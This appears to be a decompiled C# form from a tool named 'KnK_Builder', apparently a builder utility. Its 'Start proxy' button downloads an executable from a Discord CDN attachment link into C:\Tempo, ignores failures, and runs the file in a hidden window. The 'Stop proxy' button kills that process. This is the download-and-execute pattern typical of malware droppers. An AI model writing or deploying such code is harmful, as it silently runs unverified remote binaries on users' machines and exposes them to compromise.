using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using MetroFramework.Controls;

namespace KnK_Builder
{
	// Token: 0x02000003 RID: 3
	public partial class Form2 : Form
	{
		// Token: 0x06000015 RID: 21 RVA: 0x00003F48 File Offset: 0x00002148
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003F56 File Offset: 0x00002156
		private void Button1_Click(object sender, EventArgs e)
		{
			base.Hide();
			Form1 form = new Form1();
			form.Closed += delegate(object s, EventArgs args)
			{
				base.Close();
			};
			form.Show();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003F7A File Offset: 0x0000217A
		private void Stopproxy_Click(object sender, EventArgs e)
		{
			this.stopproxy.Enabled = false;
			this.startproxy.Enabled = true;
			Process.GetProcessesByName("Proxy")[0].Kill();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003FA8 File Offset: 0x000021A8
		private void Startproxy_Click(object sender, EventArgs e)
		{
			try
			{
				new WebClient
				{
					Proxy = null
				}.DownloadFile("https://cdn.discordapp.com/attachments/882970352773369906/893172127765786644/Proxy.exe", "C:\\Tempo\\Proxy.exe");
			}
			catch
			{
			}
			this.stopproxy.Enabled = true;
			this.startproxy.Enabled = false;
			new Process
			{
				StartInfo = 
				{
					FileName = "C:\\Tempo\\Proxy.exe",
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00004024 File Offset: 0x00002224
		private void Button2_Click(object sender, EventArgs e)
		{
			base.Hide();
			Form1 form = new Form1();
			form.Closed += delegate(object s, EventArgs args)
			{
				base.Close();
			};
			form.Show();
		}
	}
}
